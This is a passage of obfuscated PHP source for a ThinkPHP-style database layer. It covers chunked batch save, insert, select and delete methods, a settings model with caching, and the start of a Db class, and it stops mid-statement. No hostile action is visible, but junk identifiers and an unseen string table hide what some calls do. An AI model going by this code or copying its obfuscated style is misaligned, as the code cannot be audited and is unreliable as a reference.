unset($¾Ò¶Öœ[$Úû¬…ä]); } break; case $ìÉŒè[409]: $¾Ò¶Öœ[$Úû¬…ä] = $òşŸ“ªó[1]; break; default: break; } } } public function saveAll($âèİ»•·, $Õ©ÉùÆ· = false) { $€üöÕ¢ñ =& $_SERVER[ŒÅŸ‹ä†]; $ğ‘ù Ÿ“ = $this->db; $Õø‡Í±Ò = $this->tablePrefix . $this->tableName; $êÚ„‘¾® = $this->saveAllChunkMake($âèİ»•·); $Õ©ÉùÆ· = is_array($Õ©ÉùÆ·) ? $Õ©ÉùÆ· : array(); foreach ($êÚ„‘¾® as $æñöªÓ¼) { $‹Ç‹ªš˜ = $€üöÕ¢ñ[12]; $ñ»¨ùÚ¼ = $€üöÕ¢ñ[12]; $“öÌÅÎ = array(); $ÒÆÄÍ“Ú = array(); foreach ($æñöªÓ¼ as $Ã» À¾Ú => $Òî›ÌÑ) { $‹Ç‹ªš˜ = $Òî›ÌÑ[$€üöÕ¢ñ[464]]; $ÒÆÄÍ“Ú[] = $Òî›ÌÑ[$€üöÕ¢ñ[465]]; $’¼Å«³ó = $ğ‘ù Ÿ“->parseValue($Òî›ÌÑ[$€üöÕ¢ñ[465]]); foreach ($Òî›ÌÑ[$€üöÕ¢ñ[466]] as $Å¢ûÉ¢Í => $¬¹ë£¾) { if (!$“öÌÅÎ[$Å¢ûÉ¢Í]) { $“öÌÅÎ[$Å¢ûÉ¢Í] = array(); } $“öÌÅÎ[$Å¢ûÉ¢Í][] = $€üöÕ¢ñ[467] . $’¼Å«³ó . $€üöÕ¢ñ[468] . $ğ‘ù Ÿ“->parseValue($¬¹ë£¾); } } $½¤Í¢¼À = $‹Ç‹ªš˜; $½¤Í¢¼À = $ğ‘ù Ÿ“->parseKey($½¤Í¢¼À); foreach ($“öÌÅÎ as $Å¢ûÉ¢Í => $Ä±Åš) { $ñ»¨ùÚ¼ .= $€üöÕ¢ñ[18] . $ğ‘ù Ÿ“->parseKey($Å¢ûÉ¢Í) . $€üöÕ¢ñ[469] . $½¤Í¢¼À . $€üöÕ¢ñ[470]; $ñ»¨ùÚ¼ .= implode($€üöÕ¢ñ[18], $Ä±Åš) . $€üöÕ¢ñ[471]; } $ÏûŒØ  = $Õ©ÉùÆ·; $ÏûŒØ [$‹Ç‹ªš˜] = array($€üöÕ¢ñ[7], $ÒÆÄÍ“Ú); $ÓëùĞ£ = "\125\x50\104\101\x54\x45\40\x60{$Õø‡Í±Ò}\x60\40\x53\105\124\x20" . rtrim($ñ»¨ùÚ¼, $€üöÕ¢ñ[60]) . $€üöÕ¢ñ[18] . $ğ‘ù Ÿ“->parseWhere($ÏûŒØ ); $this->execute($ÓëùĞ£); $this->chunkEventCheck(count($æñöªÓ¼)); } $this->chunkEventSet(); } public function saveAllEach($Š›ßÀ ½, $¤µ£çò = false) { $ìêÑ‚¿ =& $_SERVER[ŒÅŸ‹ä†]; $ÉÜ™ê‚ = $this->db; $áŠ¢Æ× = $this->tablePrefix . $this->tableName; $µÖĞÔ©® = $this->saveAllChunkMake($Š›ßÀ ½); $¤µ£çò = is_array($¤µ£çò) ? $¤µ£çò : array(); foreach ($µÖĞÔ©® as $‘Æ¹ñÆ”) { foreach ($‘Æ¹ñÆ” as $êØïÔÜ => $üÛí€¶”) { $°¹çÔšß = $ìêÑ‚¿[472]; foreach ($üÛí€¶”[$ìêÑ‚¿[466]] as $§ÛÜ«øå => $´êØß­) { $°¹çÔšß .= $ÉÜ™ê‚->parseKey($§ÛÜ«øå) . $ìêÑ‚¿[473] . $ÉÜ™ê‚->parseValue($´êØß­) . $ìêÑ‚¿[60]; } $Â©¿“İ = $¤µ£çò; $Â©¿“İ[$üÛí€¶”[$ìêÑ‚¿[464]]] = $üÛí€¶”[$ìêÑ‚¿[465]]; $å…ú—µÏ = "\125\x50\104\x41\x54\x45\40\140{$áŠ¢Æ×}\140\40\x53\x45\124\40" . rtrim($°¹çÔšß, $ìêÑ‚¿[60]) . $ìêÑ‚¿[474] . $ÉÜ™ê‚->parseWhere($Â©¿“İ) . $ìêÑ‚¿[475]; $this->execute($å…ú—µÏ); } $this->chunkEventCheck(count($‘Æ¹ñÆ”)); } $this->chunkEventSet(); } private function saveAllChunkMake($ûÊ¶›Î) { $Å³“š™ä =& $_SERVER[ŒÅŸ‹ä†]; $°Ò×ä¡à = self::SQL_WHERE_IN_CHUNK; $ûÊ¶›Î = is_array($ûÊ¶›Î) ? $ûÊ¶›Î : array(); $³É‚¹Ÿ = array(); $¾õùÁ¿å = ceil(count($ûÊ¶›Î) / $°Ò×ä¡à); for ($â“œ¹å§ = 0; $â“œ¹å§ < $¾õùÁ¿å; $â“œ¹å§++) { $§Íİ‹İö = array(); $Š¯–›Èà = array_slice($ûÊ¶›Î, $â“œ¹å§ * $°Ò×ä¡à, $°Ò×ä¡à); foreach ($Š¯–›Èà as $×ÃÅÓÍà) { if (!is_array($×ÃÅÓÍà) || count($×ÃÅÓÍà) < 4 || count($×ÃÅÓÍà) % 2 != 0) { continue; } $ğùĞÁãÆ = array(); for ($ş¼÷Ù¨¡ = 2; $ş¼÷Ù¨¡ < count($×ÃÅÓÍà); $ş¼÷Ù¨¡ += 2) { $ğùĞÁãÆ[$×ÃÅÓÍà[$ş¼÷Ù¨¡]] = $×ÃÅÓÍà[$ş¼÷Ù¨¡ + 1]; } $§Íİ‹İö[] = array($Å³“š™ä[464] => $×ÃÅÓÍà[0], $Å³“š™ä[465] => $×ÃÅÓÍà[1], $Å³“š™ä[466] => $ğùĞÁãÆ); } $³É‚¹Ÿ[] = $§Íİ‹İö; } return $³É‚¹Ÿ; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($òéÕ—²‚ = false, $ÓŠğŸÜÚ = false) { $this->_chunkEvent = $òéÕ—²‚; $this->_chunkEventParam = $ÓŠğŸÜÚ; } private function chunkEventCheck($˜£ ‰ºæ) { if (!$this->_chunkEvent) { return; } $Ô«Ìé–ê = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ô«Ìé–ê[$_SERVER[ŒÅŸ‹ä†][476]] = $˜£ ‰ºæ; Hook::trigger($this->_chunkEvent, $Ô«Ìé–ê); } public function addAll($Š÷îæâ, $Àğ”ãÒ× = array(), $” ”à°¡ = false) { $ş®¥ =& $_SERVER[ŒÅŸ‹ä†]; ignore_timeout(); $²›¢§ï = self::SQL_WHERE_IN_CHUNK; if (empty($Š÷îæâ)) { $this->error = think_lang($ş®¥[359]); return !1; } $Àğ”ãÒ× = $this->_parseOptions($Àğ”ãÒ×); foreach ($Š÷îæâ as $Ñîîı› => $øÃ·ƒş) { $Š÷îæâ[$Ñîîı›] = $this->_facade($øÃ·ƒş); $this->_beforeInsert($Š÷îæâ[$Ñîîı›], $Àğ”ãÒ×); } if (method_exists($this->db, $ş®¥[360])) { for ($óÀ·À¨¹ = 0; $óÀ·À¨¹ < count($Š÷îæâ); $óÀ·À¨¹ += $²›¢§ï) { $÷Ô€Ş”¾ = array_slice($Š÷îæâ, $óÀ·À¨¹, $²›¢§ï); if (!is_array($÷Ô€Ş”¾) || count($÷Ô€Ş”¾) == 0) { break; } $“Â–è×® = $this->db->insertAll($÷Ô€Ş”¾, $Àğ”ãÒ×, $” ”à°¡); $this->chunkEventCheck(count($÷Ô€Ş”¾)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Š÷îæâ as $Ñîîı› => $øÃ·ƒş) { $“Â–è×® = $this->db->insert($øÃ·ƒş, $Àğ”ãÒ×, $” ”à°¡); } $this->commit(); } if (!1 !== $“Â–è×®) { $¾ÂÏÌ×† = $this->getLastInsID(); if ($¾ÂÏÌ×†) { return $¾ÂÏÌ×†; } } return $“Â–è×®; } public function save($Ä…¥ÈÆá = '', $¿Œ¤ı±· = array()) { $‰Ô¯åÓ =& $_SERVER[ŒÅŸ‹ä†]; $Á‹Èä‡· = self::SQL_WHERE_IN_CHUNK; $şª³÷Ù´ = $this->optionsValue(); $ï¶áû›– = $this->findWhereField($şª³÷Ù´); if (!$ï¶áû›–) { return parent::save($Ä…¥ÈÆá, $¿Œ¤ı±·); } $×­õú = 0; $§¯Ä¾ô¯ = $şª³÷Ù´[$‰Ô¯åÓ[363]][$ï¶áû›–][1]; $§¯Ä¾ô¯ = is_array($§¯Ä¾ô¯) ? $§¯Ä¾ô¯ : array(); $”£Æ×ê = count($§¯Ä¾ô¯); for ($“›×â¦ = 0; $“›×â¦ < $”£Æ×ê; $“›×â¦ += $Á‹Èä‡·) { $“ÓØìëÚ = array_slice($§¯Ä¾ô¯, $“›×â¦, $Á‹Èä‡·); if (!is_array($“ÓØìëÚ) || count($“ÓØìëÚ) == 0) { break; } $şª³÷Ù´[$‰Ô¯åÓ[363]][$ï¶áû›–][1] = $“ÓØìëÚ; $this->optionsValue($şª³÷Ù´); $×­õú += parent::save($Ä…¥ÈÆá, $¿Œ¤ı±·); $this->chunkEventCheck(count($“ÓØìëÚ)); } $this->chunkEventSet(); return $×­õú; } public function add($ê é×ÓË = '', $ÊĞ€Ö‚ˆ = array(), $ó„”³’ò = false) { if ($this->addTaskStatus && is_array($ê é×ÓË)) { $this->addTaskData[] = $ê é×ÓË; return; } return parent::add($ê é×ÓË, $ÊĞ€Ö‚ˆ, $ó„”³’ò); } public function parseWhereLike($õßòµÖ, $»ƒš¦Ø = '', $ØÜÛßØü = false, &$¡ÆÄÔÖ— = false) { $Ïºœ½ =& $_SERVER[ŒÅŸ‹ä†]; $‚¨¯üä÷ = $GLOBALS[$Ïºœ½[6]][$Ïºœ½[477]]; if (!$‚¨¯üä÷[$Ïºœ½[478]]) { return $õßòµÖ; } if (!is_array($õßòµÖ)) { return $õßòµÖ; } $Şüş«½¹ = array(); $ìÕ™¿ ÷ = 0; foreach ($õßòµÖ as $İç·øëª => $ØºæÈ­Ê) { if (is_array($ØºæÈ­Ê) && count($ØºæÈ­Ê) == 2 && $ØºæÈ­Ê[0] == $Ïºœ½[479] && is_string($ØºæÈ­Ê[1]) && substr($ØºæÈ­Ê[1], 0, 1) == $Ïºœ½[480] && substr($ØºæÈ­Ê[1], strlen($ØºæÈ­Ê[1]) - 1, 1) == $Ïºœ½[480]) { $¡ÆÄÔÖ— = !0; $°’ÖÔÓŸ = is_string($İç·øëª) ? $İç·øëª : $»ƒš¦Ø; $£üÖÔÔŞ = substr($ØºæÈ­Ê[1], 1, strlen($ØºæÈ­Ê[1]) - 2); $£üÖÔÔŞ = $this->db->escapeString($£üÖÔÔŞ); if (!strpos($°’ÖÔÓŸ, $Ïºœ½[10])) { $°’ÖÔÓŸ = $Ïºœ½[481] . $°’ÖÔÓŸ . $Ïºœ½[481]; } $°ºı«ÎÜ = $Ïºœ½[231] . $£üÖÔÔŞ . $Ïºœ½[231]; $£üÖÔÔŞ = str_replace(array($Ïºœ½[10], $Ïºœ½[482], $Ïºœ½[11]), $Ïºœ½[483], $£üÖÔÔŞ); if ($‚¨¯üä÷[$Ïºœ½[484]]) { $°ºı«ÎÜ = $Ïºœ½[485] . $£üÖÔÔŞ . $Ïºœ½[486]; if ($‚¨¯üä÷[$Ïºœ½[487]]) { $°ºı«ÎÜ = $Ïºœ½[486] . $£üÖÔÔŞ . $Ïºœ½[485]; } } $Şüş«½¹[$ìÕ™¿ ÷] = $Ïºœ½[488] . $°’ÖÔÓŸ . $Ïºœ½[489] . $°ºı«ÎÜ . $Ïºœ½[490]; $ìÕ™¿ ÷++; continue; } if (is_array($ØºæÈ­Ê)) { $»ƒš¦Ø = is_string($İç·øëª) ? $İç·øëª : $»ƒš¦Ø; $ØºæÈ­Ê = $this->parseWhereLike($ØºæÈ­Ê, $»ƒš¦Ø, !0, $¡ÆÄÔÖ—); } if (is_numeric($İç·øëª)) { $Şüş«½¹[$ìÕ™¿ ÷] = $ØºæÈ­Ê; $ìÕ™¿ ÷++; } else { $Şüş«½¹[$İç·øëª] = $ØºæÈ­Ê; } } if ($¡ÆÄÔÖ— && !$ØÜÛßØü) { } return $Şüş«½¹; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($±æ¢˜¤ = array()) { $ÒêĞŒå’ =& $_SERVER[ŒÅŸ‹ä†]; $Á¤÷¯ñ“ = self::SQL_WHERE_IN_CHUNK; $§Å½éŞË = $this->optionsValue(); $ùÜÇŸÀ = $this->findWhereField($§Å½éŞË); if (!$ùÜÇŸÀ || isset($§Å½éŞË[$ÒêĞŒå’[378]]) || isset($§Å½éŞË[$ÒêĞŒå’[438]])) { return parent::select($±æ¢˜¤); } $“Æ™ïÌ¿ = $§Å½éŞË[$ÒêĞŒå’[363]][$ùÜÇŸÀ][1]; $“Æ™ïÌ¿ = is_array($“Æ™ïÌ¿) ? $“Æ™ïÌ¿ : array(); $Œá±¾ï = null; for ($‰™©şßû = 0; $‰™©şßû < count($“Æ™ïÌ¿); $‰™©şßû += $Á¤÷¯ñ“) { $©•Í‡æ = array_slice($“Æ™ïÌ¿, $‰™©şßû, $Á¤÷¯ñ“); if (!is_array($©•Í‡æ) || count($©•Í‡æ) == 0) { break; } $§Å½éŞË[$ÒêĞŒå’[363]][$ùÜÇŸÀ][1] = $©•Í‡æ; $this->optionsValue($§Å½éŞË); $ÛŞ¨ç = parent::select($±æ¢˜¤); if (!$ÛŞ¨ç) { continue; } $Œá±¾ï = is_array($Œá±¾ï) ? $Œá±¾ï : array(); $Œá±¾ï = array_merge($Œá±¾ï, $ÛŞ¨ç); } return $Œá±¾ï; } public function delete($Íû•é«› = array()) { $èÎ®¤Ïß =& $_SERVER[ŒÅŸ‹ä†]; $æìï«Û® = self::SQL_WHERE_IN_CHUNK; $¨‘õŒğÎ = $this->optionsValue(); $»æíşŞ‰ = $this->findWhereField($¨‘õŒğÎ); if (!$»æíşŞ‰) { return parent::delete($Íû•é«›); } $¾§©â’µ = 0; $åºÁ¼Ğ´ = $¨‘õŒğÎ[$èÎ®¤Ïß[363]][$»æíşŞ‰][1]; $åºÁ¼Ğ´ = is_array($åºÁ¼Ğ´) ? $åºÁ¼Ğ´ : array(); for ($ß ‡†éç = 0; $ß ‡†éç < count($åºÁ¼Ğ´); $ß ‡†éç += $æìï«Û®) { $âãæÜô = array_slice($åºÁ¼Ğ´, $ß ‡†éç, $æìï«Û®); if (!is_array($âãæÜô) || count($âãæÜô) == 0) { break; } $¨‘õŒğÎ[$èÎ®¤Ïß[363]][$»æíşŞ‰][1] = $âãæÜô; $this->optionsValue($¨‘õŒğÎ); $¾§©â’µ += parent::delete($Íû•é«›); } return $¾§©â’µ; } private function findWhereField($·¾·ÕŒä) { $²‡—’ß =& $_SERVER[ŒÅŸ‹ä†]; $„€Öü°Ø = self::SQL_WHERE_IN_CHUNK; if (!is_array($·¾·ÕŒä) || !is_array($·¾·ÕŒä[$²‡—’ß[363]])) { return !1; } foreach ($·¾·ÕŒä[$²‡—’ß[363]] as $­±Ùæ‹ => $ áïº¬) { if (is_array($ áïº¬) && isset($ áïº¬[0]) && is_string($ áïº¬[0]) && strtolower($ áïº¬[0]) == $²‡—’ß[7] && is_array($ áïº¬[1]) && count($ áïº¬[1]) > $„€Öü°Ø) { ignore_timeout(); return $­±Ùæ‹; } } return !1; } public function setMasterDB($âŠ©Œ  = true) { think_config($_SERVER[ŒÅŸ‹ä†][491], $âŠ©Œ ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\145\x6d\x4f\x70\x74\x69\x6f\156"; public $field = array(); public function listData($¾ÌƒÇ¦³ = false, $ƒÀ‡Ï¯ = "\155\x6f\x64\151\x66\x79\124\x69\x6d\x65", $ÊµËÇˆ¦ = false) { $Ä–ğ¤û =& $_SERVER[ŒÅŸ‹ä†]; $Éñ”ö×Æ = Model($this->modelType)->get(!1, $this->optionType, !0); $¦°‡°¹É = array_values($Éñ”ö×Æ); if ($¦°‡°¹É && $¦°‡°¹É[0] && !is_array($¦°‡°¹É[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Éñ”ö×Æ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Éñ”ö×Æ) { return $¾ÌƒÇ¦³ ? null : array(); } if (!$¾ÌƒÇ¦³ && $¾ÌƒÇ¦³ !== $Ä–ğ¤û[239]) { $Éñ”ö×Æ = array_filter(array_values($Éñ”ö×Æ)); return array_sort_by($Éñ”ö×Æ, $ƒÀ‡Ï¯, $ÊµËÇˆ¦, $Ä–ğ¤û[492]); } return $Éñ”ö×Æ[$Ä–ğ¤û[493] . $¾ÌƒÇ¦³]; } public function insert($Şğ²øœæ) { $³§÷Òˆò =& $_SERVER[ŒÅŸ‹ä†]; $Şğ²øœæ = array_field_key($Şğ²øœæ, $this->field); $¹³ªş•© = Model($this->modelType)->get($³§÷Òˆò[494], $this->optionType . $³§÷Òˆò[495]); $¹³ªş•© = $¹³ªş•© ? $¹³ªş•© : 0; $Şğ²øœæ[$³§÷Òˆò[492]] = ++$¹³ªş•©; $Şğ²øœæ[$³§÷Òˆò[242]] = time(); $Şğ²øœæ[$³§÷Òˆò[98]] = time(); Model($this->modelType)->set($³§÷Òˆò[494], $¹³ªş•©, $this->optionType . $³§÷Òˆò[495]); Model($this->modelType)->set($³§÷Òˆò[493] . $¹³ªş•©, $Şğ²øœæ, $this->optionType); return $¹³ªş•©; } public function insertArr($×†êÀË×) { $ññÑ„ŸÑ =& $_SERVER[ŒÅŸ‹ä†]; if (!$×†êÀË× || !is_array($×†êÀË×)) { return !1; } $‡æéì¹Ê = Model($this->modelType)->get($ññÑ„ŸÑ[494], $this->optionType . $ññÑ„ŸÑ[495]); $‡æéì¹Ê = $‡æéì¹Ê ? $‡æéì¹Ê : 0; $–ëåŠ” = array(); foreach ($×†êÀË× as $—Õûéë) { $´›¯ÂÎÜ = array_field_key($—Õûéë, $this->field); $´›¯ÂÎÜ[$ññÑ„ŸÑ[492]] = ++$‡æéì¹Ê; $´›¯ÂÎÜ[$ññÑ„ŸÑ[242]] = time(); $´›¯ÂÎÜ[$ññÑ„ŸÑ[98]] = time(); $–ëåŠ”[$ññÑ„ŸÑ[493] . $‡æéì¹Ê] = $´›¯ÂÎÜ; } Model($this->modelType)->set($ññÑ„ŸÑ[494], $‡æéì¹Ê, $this->optionType . $ññÑ„ŸÑ[495]); Model($this->modelType)->set($–ëåŠ”, !1, $this->optionType); return $‡æéì¹Ê; } public function update($é¬€ÄÏ, $‡µÊüü) { $½ãîÙ®â =& $_SERVER[ŒÅŸ‹ä†]; $‡µÊüü = array_field_key($‡µÊüü, $this->field); $¹µÃÈÑø = $this->listData($é¬€ÄÏ); if (!$¹µÃÈÑø || !$é¬€ÄÏ) { return !1; } $‡µÊüü = array_merge($¹µÃÈÑø, $‡µÊüü); $‡µÊüü[$½ãîÙ®â[98]] = time(); return Model($this->modelType)->set($½ãîÙ®â[493] . $é¬€ÄÏ, $‡µÊüü, $this->optionType); } public function remove($ºÖÛõ•Ø) { if (!$ºÖÛõ•Ø) { return !1; } return Model($this->modelType)->remove($_SERVER[ŒÅŸ‹ä†][493] . $ºÖÛõ•Ø, $this->optionType); } public function removeArr($¸†úµß¨) { if (!$¸†úµß¨) { return !0; } $ø²„‰Ì· = array(); foreach ($¸†úµß¨ as $¯½Û½†Ò) { $ø²„‰Ì·[] = $_SERVER[ŒÅŸ‹ä†][493] . $¯½Û½†Ò; } return Model($this->modelType)->removeArr($ø²„‰Ì·, $this->optionType); } public function clear() { $ Ì†×ºÌ =& $_SERVER[ŒÅŸ‹ä†]; Model($this->modelType)->remove($ Ì†×ºÌ[494], $this->optionType . $ Ì†×ºÌ[495]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ââì–ÃÖ, $ÓƒõÉ…) { if (!$ÓƒõÉ…) { return !1; } $²àû°Ó¶ = $this->listData(); $²àû°Ó¶ = array_to_keyvalue($²àû°Ó¶, $ââì–ÃÖ); return isset($²àû°Ó¶[$ÓƒõÉ…]) ? $²àû°Ó¶[$ÓƒõÉ…] : !1; } public function findByName($º§Ï†Úª) { return $this->findByKey($_SERVER[ŒÅŸ‹ä†][42], $º§Ï†Úª); } protected function resetData($äÖöÁ×·) { $úŠşÉ — =& $_SERVER[ŒÅŸ‹ä†]; if (!$äÖöÁ×·) { return; } $äÖöÁ×· = is_array($äÖöÁ×·) ? $äÖöÁ×· : array(); $ß¾ó¢¡Ì = array(); for ($ğ²ˆ“ = 0; $ğ²ˆ“ < count($äÖöÁ×·); $ğ²ˆ“++) { if (!$äÖöÁ×·[$ğ²ˆ“] || !$äÖöÁ×·[$ğ²ˆ“][$úŠşÉ —[492]]) { continue; } $ß¾ó¢¡Ì[$úŠşÉ —[493] . $äÖöÁ×·[$ğ²ˆ“][$úŠşÉ —[492]]] = $äÖöÁ×·[$ğ²ˆ“]; } return Model($this->modelType)->set($ß¾ó¢¡Ì, !1, $this->optionType); } private function getAutoName($‰Ş˜å­¡) { $äè¹¥ÌÑ = array_to_keyvalue($this->listData(), $_SERVER[ŒÅŸ‹ä†][42]); if (!$äè¹¥ÌÑ || !isset($äè¹¥ÌÑ[$‰Ş˜å­¡])) { return $‰Ş˜å­¡; } for ($µ­ß°•ù = 1; $µ­ß°•ù < count($äè¹¥ÌÑ); $µ­ß°•ù++) { $é½Ş¢¯­ = $‰Ş˜å­¡ . "\x28{$µ­ß°•ù}\x29"; if (!isset($äè¹¥ÌÑ[$é½Ş¢¯­])) { return $é½Ş¢¯­; } } return $é½Ş¢¯­; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ìØˆ¦Ö” = false, $áøó˜‚ş = '', $¾×ã¨şÄ = false, $ÄğêúÊ¶ = true) { $Ğ¦¤Ñ†Ö =& $_SERVER[ŒÅŸ‹ä†]; $‡Íñ‹ÜÂ = $this->cacheGet($áøó˜‚ş); $ìÅ¦Ó = $this->optionDefault($áøó˜‚ş); $ìÅ¦Ó = is_array($ìÅ¦Ó) ? $ìÅ¦Ó : array(); if (is_array($‡Íñ‹ÜÂ)) { if ($ÄğêúÊ¶) { $‡Íñ‹ÜÂ = array_merge($ìÅ¦Ó, $‡Íñ‹ÜÂ); } return $ìØˆ¦Ö” ? isset($‡Íñ‹ÜÂ[$ìØˆ¦Ö”]) ? $‡Íñ‹ÜÂ[$ìØˆ¦Ö”] : null : $‡Íñ‹ÜÂ; } $·èñ‡à‡ = $this->filterWhere(array($Ğ¦¤Ñ†Ö[43] => $áøó˜‚ş)); $‡Íñ‹ÜÂ = $this->where($·èñ‡à‡)->select(); $‡Íñ‹ÜÂ = array_to_keyvalue($‡Íñ‹ÜÂ, $Ğ¦¤Ñ†Ö[105], $Ğ¦¤Ñ†Ö[460]); foreach ($‡Íñ‹ÜÂ as $¥Ë­äÚÑ => $œŸÖ«Í“) { if ($¾×ã¨şÄ || in_array($¥Ë­äÚÑ, $this->jsonField)) { $‡Íñ‹ÜÂ[$¥Ë­äÚÑ] = json_decode($œŸÖ«Í“, !0); } } $this->cacheSet($áøó˜‚ş, $‡Íñ‹ÜÂ); if ($ÄğêúÊ¶) { $‡Íñ‹ÜÂ = array_merge($ìÅ¦Ó, $‡Íñ‹ÜÂ); } return $ìØˆ¦Ö” ? $‡Íñ‹ÜÂ[$ìØˆ¦Ö”] : $‡Íñ‹ÜÂ; } public function set($‘¯¦œ®, $Œºó–¤ = false, $ÍéË–à© = '') { $Ò³Û®ß™ =& $_SERVER[ŒÅŸ‹ä†]; if (!$‘¯¦œ®) { return !0; } $áˆ¨Íú  = $this->get(!1, $ÍéË–à©, !1, !1); $áˆ¨Íú  = is_array($áˆ¨Íú ) ? $áˆ¨Íú  : array(); $ä±ÉÌ± = array(); $¸ì·¢ëï = array(); $ä®îı«Ó = array(); $óøÍ©’ = is_array($‘¯¦œ®) ? $‘¯¦œ® : array($‘¯¦œ® => $Œºó–¤); $Úù·‹ = $this->filterWhere(array($Ò³Û®ß™[43] => $ÍéË–à©)); foreach ($óøÍ©’ as $äÇ›·“  => $øÍÌçÑî) { if (is_array($øÍÌçÑî)) { $øÍÌçÑî = json_encode_force($øÍÌçÑî); } $this->checkLength($øÍÌçÑî, !1, $this->tableName . $Ò³Û®ß™[4] . $‘¯¦œ®); $øÍÌçÑî = self::textEncode($øÍÌçÑî); if (array_key_exists($äÇ›·“ , $áˆ¨Íú )) { $©öÃâï = is_array($áˆ¨Íú [$äÇ›·“ ]) ? json_encode_force($áˆ¨Íú [$äÇ›·“ ]) : $áˆ¨Íú [$äÇ›·“ ]; $©öÃâï = self::textEncode($©öÃâï); if ($©öÃâï === $øÍÌçÑî) { continue; } $¸ì·¢ëï[] = array($Ò³Û®ß™[105], $äÇ›·“ , $Ò³Û®ß™[460], $øÍÌçÑî, $Ò³Û®ß™[98], time()); } else { $ÒÜİÌÑ¢ = array($Ò³Û®ß™[43] => $ÍéË–à©, $Ò³Û®ß™[105] => $äÇ›·“ , $Ò³Û®ß™[460] => $øÍÌçÑî); $ä±ÉÌ±[] = $this->filterWhere($ÒÜİÌÑ¢); } } if (!$ä±ÉÌ± && !$¸ì·¢ëï) { return !0; } $this->cacheRemove($ÍéË–à©); $³Á“è«¹ = $this->cacheKey($Ò³Û®ß™[496]); CacheLock::lock($³Á“è«¹); if ($ä±ÉÌ±) { $this->addAll($ä±ÉÌ±); } if ($¸ì·¢ëï) { $this->saveAll($¸ì·¢ëï, $Úù·‹); } CacheLock::unlock($³Á“è«¹); return !0; } protected function optionDefault($©«ÒÈÙÔ = '') { return !1; } public function setDeep($áô¥§¬î, $şî·Ü¨¤ = false, $‡ùß˜çß = '') { $Ş¾¶±Â = explode($_SERVER[ŒÅŸ‹ä†][10], $áô¥§¬î); $¸ı³¬‚Ç = $this->get(); array_set_value($¸ı³¬‚Ç, $áô¥§¬î, $şî·Ü¨¤); $this->set($Ş¾¶±Â[0], $¸ı³¬‚Ç[$Ş¾¶±Â[0]], $‡ùß˜çß); } public function remove($ôŠÏ›øŠ, $äÖÆ£  = '') { $¸Ø¹ÔÇ“ =& $_SERVER[ŒÅŸ‹ä†]; $this->cacheRemove($äÖÆ£ ); $§ÔØ¼êš = $this->filterWhere(array($¸Ø¹ÔÇ“[105] => $ôŠÏ›øŠ, $¸Ø¹ÔÇ“[43] => $äÖÆ£ )); if (is_null($ôŠÏ›øŠ)) { unset($§ÔØ¼êš[$¸Ø¹ÔÇ“[105]]); } return $this->where($§ÔØ¼êš)->delete(); } public function removeArr($œœüÆŠµ, $·ç°äß = '') { $‹ª˜™ó =& $_SERVER[ŒÅŸ‹ä†]; if (!$œœüÆŠµ || !is_array($œœüÆŠµ)) { return !0; } $this->cacheRemove($·ç°äß); $ô›¸„¡ü = $this->filterWhere(array($‹ª˜™ó[43] => $·ç°äß, $‹ª˜™ó[105] => array($‹ª˜™ó[7], $œœüÆŠµ))); return $this->where($ô›¸„¡ü)->delete(); } public function cacheSet($¯ÖîŸœ, $±©¸é…‘ = false) { return Cache::set($this->cacheKey($¯ÖîŸœ), $±©¸é…‘); } public function cacheGet($ã¡®¥Û¯) { return Cache::get($this->cacheKey($ã¡®¥Û¯)); } public function cacheRemove($ÙĞ§îŒ) { return Cache::remove($this->cacheKey($ÙĞ§îŒ)); } protected function filterWhere($ëöÏÖ˜È) { return $ëöÏÖ˜È; } protected function cacheKey($ ™…óĞÛ) { return $ ™…óĞÛ; } } goto aÉõ±¤î©Ô; c²òÇ“¡š’: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\145\x71" => "\74\76", "\147\x74" => "\x3e", "\x65\x67\164" => "\x3e\75", "\154\164" => "\x3c", "\x65\154\164" => "\x3c\x3d", "\156\x6f\x74\154\151\x6b\x65" => "\x4e\117\124\x20\114\x49\x4b\105", "\154\151\x6b\145" => "\x4c\x49\113\105", "\x69\x6e" => "\111\116", "\x6e\157\164\151\156" => "\x4e\x4f\124\40\111\116", "\156\x6f\164\40\151\156" => "\x4e\x4f\124\40\111\116", "\x62\145\164\x77\145\x65\x6e" => "\x42\x45\124\x57\x45\x45\x4e", "\x6e\157\x74\142\x65\x74\x77\145\x65\x6e" => "\x4e\x4f\x54\40\x42\105\x54\127\x45\x45\x4e", "\x6e\157\164\40\142\x65\164\x77\x65\145\x6e" => "\116\117\124\x20\102\105\x54\127\x45\105\116"); protected $selectSql = "\x53\105\114\105\x43\x54\45\x44\111\x53\124\x49\x4e\x43\124\45\x20\x25\106\111\105\114\x44\x25\40\x46\x52\117\x4d\x20\x25\124\x41\x42\114\105\x25\x25\x4a\117\111\116\x25\x25\x57\x48\x45\122\105\x25\x25\x47\x52\x4f\125\x50\x25\x25\110\x41\x56\111\116\x47\x25\x25\117\122\104\105\122\45\x25\x4c\x49\115\111\124\x25\40\45\125\116\x49\x4f\x4e\x25\45\103\117\x4d\x4d\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $û ñ÷Œë = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ŒÅŸ‹ä†][1071], $û ñ÷Œë); } public function factory($ÜÌµæ¥Ù = '') { $ßŸüâÄ° =& $_SERVER[ŒÅŸ‹ä†]; $ÜÌµæ¥Ù = $this->parseConfig($ÜÌµæ¥Ù); if 